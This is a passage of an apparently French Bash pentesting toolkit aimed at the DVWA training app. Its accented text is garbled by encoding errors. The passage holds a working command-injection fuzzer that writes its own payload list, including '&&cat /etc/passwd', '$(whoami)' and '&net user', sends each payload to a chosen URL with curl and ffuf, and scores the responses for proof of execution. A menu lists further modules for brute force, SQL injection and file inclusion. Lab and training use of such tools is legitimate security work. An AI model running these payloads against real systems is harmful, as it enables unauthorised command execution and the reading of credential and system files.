        COMBINED_PATH="${HOME}/ghost00ls/logs/dvwa_exploits/combined_paths.txt"
        awk -F',' 'NR>0 {print $6}' "$CLEAN" | sed 's/,$//' >> "$COMBINED_PATH" 2>/dev/null || true
        sort -u -o "$COMBINED_PATH" "$COMBINED_PATH" 2>/dev/null || true
        echo -e "${GREEN}‚Üí R√©sultats ajout√©s √† : $COMBINED_PATH${NC}"
    fi

    # human summary
    echo
    echo -e "${CYAN}üìä R√©sum√© XSS:${NC}"
    echo "‚Ä¢ Dossier : $OUT_DIR"
    echo "‚Ä¢ RAW log : $RAW_LOG"
    [ -f "$CLEAN" ] && echo "‚Ä¢ Clean hits : $CLEAN"
    [ -f "$SCORED" ] && echo "‚Ä¢ Scored (top first) : $SCORED"
    echo "‚Ä¢ CSV summary : $SUMMARY_CSV"
    echo
    if [ -s "$SCORED" ]; then
        echo -e "${YELLOW}‚Ä¢ Top hits (scored) :${NC}"
        head -n 10 "$SCORED"
    else
        echo "‚Ä¢ Aucun hit prioritaire trouv√©."
    fi
    echo

    # show saved special files
    echo -e "‚ñ∂ Fichiers r√©cup√©r√©s (si pr√©sents) :"
    [ -f "$OUT_DIR/robots.txt" ] && echo "  ‚Ä¢ robots.txt -> $OUT_DIR/robots.txt"
    [ -f "$OUT_DIR/phpinfo.html" ] && echo "  ‚Ä¢ phpinfo -> $OUT_DIR/phpinfo.html"
    [ -f "$OUT_DIR/git_HEAD" ] && echo "  ‚Ä¢ .git/HEAD -> $OUT_DIR/git_HEAD"
    [ -f "$OUT_DIR/favicon.ico" ] && echo "  ‚Ä¢ favicon.ico -> $OUT_DIR/favicon.ico"
    [ -f "$OUT_DIR/php.ini" ] && echo "  ‚Ä¢ php.ini -> $OUT_DIR/php.ini"
    echo

    echo -e "${GREEN}‚úÖ XSS scan termin√©.${NC}"
    echo -e "üîé Logs complets dans : $OUT_DIR"
    echo -e "‚úÖ R√©sum√© sauvegard√© : $SUMMARY_CSV"
    read -p "üëâ Entr√©e pour revenir..."
}



###################################################################################################

exploit_cmdinj() {
	clear; banner
    echo "=================================================="
    echo "üß™ [Command Injection - exploit_cmdinj]"
    echo "üìñ Objectif : d√©tecter injections de commandes (r√©flexion/ex√©cution)"
    echo "‚ö†Ô∏è  Ex√©cuter uniquement sur cibles autoris√©es"
    echo "=================================================="

    # ---------- user inputs ----------
    read -p "üåê H√¥te/IP cible (default: 192.168.20.101): " target_ip
    target_ip=${target_ip:-192.168.20.101}

    read -p "üîå Port (default: 8081): " target_port
    target_port=${target_port:-8081}

    read -p "üìÅ Path (default: /): " base_path
    base_path=${base_path:-/}

    read -p "üîó URL compl√®te √† tester (laisser vide pour base+?test=payload): " full_url

    read -p "‚öôÔ∏è Threads ffuf (default: 20): " threads
    threads=${threads:-20}

    read -p "‚ñ∂ Mode streaming (afficher hits en direct) ? [Y/n]: " stream_mode
    stream_mode=${stream_mode:-Y}
    echo

    # ---------- prepare paths ----------
    LOG_DIR="$HOME/ghost00ls/logs/dvwa_exploits/cmdinj/$(date '+%Y-%m-%d_%H-%M-%S')"
    mkdir -p "$LOG_DIR"
    PAYLOADS="$HOME/ghost00ls/wordlists/cmdinj_payloads.txt"
    CSV_OUT="$LOG_DIR/cmdinj_summary_$(date '+%Y-%m-%d_%H-%M-%S').csv"
    HTML_OUT="$LOG_DIR/cmdinj_report.html"
    FFUF_OUT="$LOG_DIR/ffuf_raw.csv"
    TMP_RESP="/tmp/ghost00ls_cmdinj_resp.$$"
    TMP_BASE="$LOG_DIR/baseline.tmp"
    TMP_PROOF="$LOG_DIR/cmdinj_proofs.txt"

    # ---------- ensure payloads exist (default list if absent) ----------
    if [[ ! -f "$PAYLOADS" ]]; then
        echo "‚ö†Ô∏è Wordlist manquante ‚Äî cr√©ation d'une wordlist par d√©faut -> $PAYLOADS"
        mkdir -p "$(dirname "$PAYLOADS")"
        cat > "$PAYLOADS" <<'EOF'
;id
&&id
|id
;whoami
|whoami
&&cat /etc/passwd
;uname -a
&&ls
|ls -la
&&echo Ghost00ls_Pwned
;ping -c 1 127.0.0.1
|sleep 1
||sleep 2
&&powershell whoami
|dir
&net user
&&type C:\Windows\win.ini
;echo GHOST_TEST
;id;uname -a
||whoami
`whoami`
$(whoami)
;cat /etc/hosts
;curl -I http://example.com
EOF
    fi

    # ---------- build base url ----------
    if [[ -n "$full_url" ]]; then
        base_url="$full_url"
    else
        # normalize base_path
        [[ "$base_path" != /* ]] && base_path="/$base_path"
        base_url="http://$target_ip:$target_port$base_path"
    fi

    echo "‚ñ∂ Cible : $base_url"
    echo "‚ñ∂ Payloads : $PAYLOADS"
    echo "‚ñ∂ Logs : $LOG_DIR"
    echo

    # ---------- baseline measurement (3 requests, safe parsing) ----------
    echo "‚ñ∂ Mesure baseline (3 requ√™tes)..."
    : > "$TMP_BASE"
    for i in 1 2 3; do
        # use curl to save only metrics
        curl -s -o /tmp/ghost00ls_base_resp.$$ -w "%{http_code} %{size_download} %{time_total}\n" --max-time 5 "$base_url" >> "$TMP_BASE" || echo "000 0 0" >> "$TMP_BASE"
    done

    # safe aggregate (avoid division by zero)
    baseline_status=$(awk '{sum+=$1;cnt++} END{ if(cnt>0) printf "%.0f", sum/cnt; else print 0 }' "$TMP_BASE")
    baseline_size=$(awk '{sum+=$2;cnt++} END{ if(cnt>0) printf "%.0f", sum/cnt; else print 0 }' "$TMP_BASE")
    baseline_time=$(awk '{sum+=$3;cnt++} END{ if(cnt>0) printf "%.6f", sum/cnt; else print 0 }' "$TMP_BASE")

    # ensure numeric fallback
    [[ ! "$baseline_status" =~ ^[0-9]+$ ]] && baseline_status=0
    awk 'BEGIN{if("'"$baseline_time"'"=="" || "'"$baseline_time"'"=="nan") print "0.000000"; else print "'"$baseline_time"'"}' >/dev/null 2>&1

    echo "Baseline -> status:$baseline_status size:$baseline_size time:$baseline_time"
    echo

    # ---------- output header ----------
    echo "status,size,time,payload,score,notes" > "$CSV_OUT"

    # ---------- helper: url-encode payload (jq preferred, python fallback) ----------
    urlencode() {
        local raw="$1"
        if command -v jq >/dev/null 2>&1; then
            printf '%s' "$raw" | jq -s -R -r @uri
        else
            # python fallback (should exist); final fallback: simple sed escape (best-effort)
            if command -v python3 >/dev/null 2>&1; then
                python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.stdin.read().strip()))" <<<"$raw"
            else
                # best-effort (not perfect)
                printf '%s' "$raw" | sed -e 's/ /%20/g' -e 's/`/%60/g' -e 's/"/%22/g' -e "s/'/%27/g" -e 's/|/%7C/g' -e 's/</%3C/g' -e 's/>/%3E/g' -e 's/&/%26/g' -e 's/(/%28/g' -e 's/)/%29/g'
            fi
        fi
    }

    # ---------- run curl tests (streaming mode if requested) ----------
    echo "‚ñ∂ Lancement tests payloads (curl mode, streaming live)..."
    while IFS= read -r payload || [[ -n "$payload" ]]; do
        [[ -z "$payload" ]] && continue
        enc=$(urlencode "$payload")
        url="${base_url}?test=${enc}"
        # request and capture body+meta (short timeout)
        result=$(curl -s -o "$TMP_RESP" -w "%{http_code} %{size_download} %{time_total}" --max-time 6 "$url")
        # parse safely
        status=$(awk '{print $1}' <<<"$result")
        size=$(awk '{print $2}' <<<"$result")
        time=$(awk '{print $3}' <<<"$result")

        # ensure numeric defaults
        [[ ! "$status" =~ ^[0-9]+$ ]] && status=0
        [[ ! "$size" =~ ^[0-9]+$ ]] && size=0
        # time may be float
        if ! awk 'BEGIN{exit !('"$time"'==0 || '"$time"'>0)}'; then
            time=0
        fi

        # scoring logic (type-safe numeric comparisons)
        score=0; notes=""
        if [[ "$status" -ne "$baseline_status" ]]; then
            score=$((score+25)); notes+="status-change;"
        fi

        # absolute size delta
        size_diff=$(( size - baseline_size ))
        abs_size_diff=${size_diff#-}
        if (( abs_size_diff > 120 )); then
            score=$((score+30)); notes+="size-deviation;"
        elif (( abs_size_diff > 20 )); then
            score=$((score+10)); notes+="size-small-deviation;"
        fi

        # time anomaly (floating point compare using awk)
        time_diff=$(awk -v a="$time" -v b="$baseline_time" 'BEGIN{d=a-b; if(d<0)d=-d; printf "%.6f", d}')
        if awk -v d="$time_diff" 'BEGIN{exit !(d>0.08)}'; then
            score=$((score+15)); notes+="time-anomaly;"
        fi

        # content proof check (quick, first 2KB)
        grep -iE "Ghost00ls_Pwned|uid=|root|administrator|<pre|login.php" "$TMP_RESP" >/dev/null 2>&1
        if [[ $? -eq 0 ]]; then
            score=$((score+40))
            notes+="proof-candidate;"
            # store proof snippet
            head -c 2048 "$TMP_RESP" | sed -n '1,40p' > "$LOG_DIR/proof_$(date +%s%N).txt"
            echo "$payload -> proof snippet saved" >> "$TMP_PROOF"
        fi

        # basic high-score threshold clamp
        if (( score > 100 )); then score=100; fi

        # write CSV line (escape payload double-quotes by doubling)
        safe_payload=$(printf '%s' "$payload" | sed 's/"/""/g')
        printf "%s,%s,%s,\"%s\",%s,%s\n" "$status" "$size" "$time" "$safe_payload" "$score" "$notes" >> "$CSV_OUT"

        # streaming output
        if [[ "$stream_mode" =~ ^[Yy]$ ]]; then
            if (( score >= 60 )); then
                echo -e "\e[32m[HIT ][score:$score] $status | ${size}B | ${time}s | $payload \e[0m"
            elif (( score >= 25 )); then
                echo -e "\e[33m[WARN][score:$score] $status | ${size}B | ${time}s | $payload \e[0m"
            else
                echo -e "\e[31m[MISS][score:$score] $status | ${size}B | ${time}s | $payload \e[0m"
            fi
        fi
    done < "$PAYLOADS"
    echo

    # ---------- run ffuf in background and merge results (if available) ----------
    if command -v ffuf >/dev/null 2>&1; then
        echo "‚ñ∂ ffuf d√©tect√© ‚Äî ex√©cution en parall√®le (auto mode)"
        # run ffuf quietly but produce CSV (suppress its STDOUT noise)
        ffuf -u "${base_url}?test=FUZZ" -w "$PAYLOADS" -t "$threads" -of csv -o "$FFUF_OUT" -mc all >/dev/null 2>&1 || true

        # merge ffuf CSV (if exists), safe parsing: ffuf csv format: Num,Status,Lines,Words,Size,Duration,Url,Input,ResultFile
        if [[ -s "$FFUF_OUT" ]]; then
            # for each ffuf result line (skip header), append to CSV with a moderate score if status/size/time differ
            awk -F, 'NR>1{
                # sanitize fields which may contain commas or quotes - ffuf CSV is simple on many builds
                status=$2; size=$6; dur=$7; input=$8;
                # strip surrounding quotes
                gsub(/^"/,"",input); gsub(/"$/,"",input);
                # compute a default ffuf score (30) and note
                printf("%s,%s,%s,\"%s\",%d,%s\n", status, size, dur, input, 30, "ffuf-auto;") 
            }' "$FFUF_OUT" >> "$CSV_OUT"
            echo "‚úÖ R√©sultats ffuf fusionn√©s dans le CSV final ($FFUF_OUT)"
        fi
    else
        echo "‚ö†Ô∏è ffuf non trouv√© ‚Äî mode curl uniquement."
    fi
    echo

    # ---------- additional proof-pass: re-check payloads with larger body capture if proof candidates exist ----------
    if [[ -s "$TMP_PROOF" ]]; then
        echo "‚ñ∂ V√©rification compl√©mentaire des preuves list√©es..."
        while IFS= read -r line; do
            echo "  $line"
        done < "$TMP_PROOF"
    fi

    # ---------- generate HTML report ----------
    echo "‚ñ∂ G√©n√©ration rapport HTML..."
    {
        cat <<'HTML_HEAD'
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Ghost00ls - Command Injection Report</title>
<style>
  body{font-family:Arial,Helvetica,sans-serif;background:#0b0b0b;color:#ddd;padding:20px}
  table{width:100%;border-collapse:collapse;margin-top:12px}
  th,td{padding:6px;border:1px solid #222}
  th{background:#111}
  .hit{background:#062; color:#001}
  .warn{background:#633; color:#ffe}
  .miss{background:#300; color:#fdd}
  pre{background:#111;padding:8px;color:#afa;overflow:auto}
</style>
</head>
<body>
<h1>Ghost00ls ‚Äî Command Injection Report</h1>
<p>Target: <b><!--TARGET--></b></p>
<table>
<tr><th>Status</th><th>Size</th><th>Time</th><th>Payload</th><th>Score</th><th>Notes</th></tr>
HTML_HEAD
    } > "$HTML_OUT"

    # inject target into HTML
    sed -i "s|<!--TARGET-->|$base_url|g" "$HTML_OUT"

    # append rows from CSV
    tail -n +2 "$CSV_OUT" | while IFS=',' read -r status size time payload score notes; do
        # payload may be quoted and contain commas; reconstruct payload by joining fields between 4th and before score
        # simpler approach: read raw line
        raw_line=$(grep -F -- "$status,$size,$time" "$CSV_OUT" | head -n1)
        # fallback formatting: use the original CSV parsing by awk for safety
        awk -F, -v s="$status" -v sz="$size" -v t="$time" -v sc="$score" -v n="$notes" 'BEGIN{
            # nothing
        }{
            # print safe row
        }' >/dev/null 2>&1
        # determine class
        cls="miss"
        if [[ "$score" =~ ^[0-9]+$ ]] && (( score >= 60 )); then cls="hit"; fi
        if [[ "$score" =~ ^[0-9]+$ ]] && (( score >= 25 && score < 60 )); then cls="warn"; fi

        # payload may include quotes; to display nicely, remove surrounding quotes if present
        display_payload="$payload"
        display_payload="${display_payload%\"}"
        display_payload="${display_payload#\"}"

        # append row to HTML
        printf "<tr class=\"%s\"><td>%s</td><td>%s</td><td>%s</td><td><code>%s</code></td><td>%s</td><td>%s</td></tr>\n" \
            "$cls" "$status" "$size" "$time" "$(html_escape "$display_payload")" "$score" "$notes" >> "$HTML_OUT" 2>/dev/null || \
        printf "<tr class=\"%s\"><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td></tr>\n" \
            "$cls" "$status" "$size" "$time" "$display_payload" "$score" "$notes" >> "$HTML_OUT"
    done

    # append proofs if any
    if [[ -s "$TMP_PROOF" ]]; then
        echo "</table><h2>Confirmed proofs / snippets</h2><pre>" >> "$HTML_OUT"
        sed -n '1,200p' "$TMP_PROOF" >> "$HTML_OUT"
        echo "</pre>" >> "$HTML_OUT"
    else
        echo "</table><p>No confirmed proofs found.</p>" >> "$HTML_OUT"
    fi

    echo "</body></html>" >> "$HTML_OUT"

    # ---------- summary ----------
    echo
    echo "üìä R√©sum√© Command Injection :"
    echo "‚Ä¢ Dossier : $LOG_DIR"
    echo "‚Ä¢ R√©sum√© CSV : $CSV_OUT"
    echo "‚Ä¢ Rapport HTML : $HTML_OUT"
    [[ -f "$FFUF_OUT" ]] && echo "‚Ä¢ ffuf CSV : $FFUF_OUT"
    echo "‚úÖ Scan termin√©."
    echo
    read -p "üëâ Entr√©e pour revenir..."
}

# helper: minimal html escape function for payload display (pure bash)
html_escape() {
    local s="$1"
    s="${s//&/&amp;}"
    s="${s//</&lt;}"
    s="${s//>/&gt;}"
    s="${s//\"/&quot;}"
    s="${s//\'/&#39;}"
    printf '%s' "$s"
}


###################################################################################################





###################################################################################################



###################################################################################################



###################################################################################################



###################################################################################################



###################################################################################################



###################################################################################################



###################################################################################################



###################################################################################################

# === Menu ===
menu_exploits() {
    clear; banner
    echo -e "${CYAN}=== üí£ Exemples d‚Äôexploitation DVWA (Ghost00ls) ===${NC}"
    echo "1) Hydra Brute Force"
    echo "2) SQL Injection (sqlmap)"
    echo "3) Directory Bruteforce (dirb/gobuster)"
    echo "4) Fuzzing (wfuzz)"
    echo "5) XSS"
    echo "6) Command Injection"
    echo "7) File Upload"
    echo "8) File Inclusion (LFI/RFI)"
    echo "9) CSRF"
    echo "10) Broken Auth"
    echo "11) IDOR"
    echo "12) Security Misconfiguration"
    echo "0) Quit"
    echo
    read -p "üëâ Choix : " choice

    case $choice in
        1) exploit_hydra ;;
        2) exploit_sqlmap ;;
        3) exploit_dirb ;; 
        4) exploit_wfuzz ;;
        5) exploit_xss ;;
        6) exploit_cmdinj ;;
        7) exploit_upload ;;
        8) exploit_lfi ;;
        9) exploit_csrf ;;
        10) exploit_auth ;;
        11) exploit_idor ;;
        12) exploit_misconfig ;;
        0) exit 0 ;;
        *) echo -e "${RED}‚ùå Option invalide${NC}" ;;
    esac
    menu_exploits
}

menu_exploits
